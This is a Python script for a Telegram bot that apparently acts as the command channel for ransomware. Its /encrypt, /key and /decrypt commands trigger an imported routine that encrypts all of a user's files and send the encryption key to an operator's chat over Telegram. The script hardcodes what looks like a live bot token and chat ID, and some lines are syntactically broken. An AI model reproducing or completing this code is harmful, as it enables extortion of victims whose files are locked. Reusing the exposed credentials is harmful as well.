import time
import os
import random
import telebot
import encrypt_all
from encrypt_all import encrypt, decrypt

Chat_ID = os.environ['5650788149']

API_KEY = os.environ['7814826340:AAEZSIvHuTIN2wmL9N9Sq3P7MX_JF6YSyEk']

bot = telebot.TeleBot(7814826340:AAEZSIvHuTIN2wmL9N9Sq3P7MX_JF6YSyEk)

#encrypt()
time.sleep(0.5)
keyfile = open('key_all.mortkey', 'rb')
key = keyfile.read()
time.sleep(0.5)

upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
lower = "abcdefghijklmnopqrstuvwxyz"
numbers = "0123456789"
symbols = "!@#$%^&*(){}~."
string = upper+lower+numbers+symbols
length = 9



@bot.message_handler(commands=['help'])
def send_welcome(message):
	bot.reply_to(message, "Use /encrypt then /key then /decrypt")
@bot.message_handler(commands=['encrypt'])
def encrypting(message):
  encrypt()
  key_file = open('key_all.mortkey', 'rb')
  key_key = key_file.read()
  user = "".join(random.sample(string,length))
  bot.send_message(Chat_ID, "Done, All Files For The User ('{}') Are Encrypted, and His Key is ({})".format(user, key_key))
@bot.message_handler(commands=['key'])
def key(message):
  key_file = open('key_all.mortkey', 'rb')
  key_key = key_file.read()
  bot.send_message(Chat_ID, "The Most Recent key is ({})".format(key_key))
@bot.message_handler(commands=['decrypt'])
def decrypting(message):
  bot.send_message(Chat_ID, 'Done His Files Are Decrypted')
  decrypt()


bot.infinity_polling()
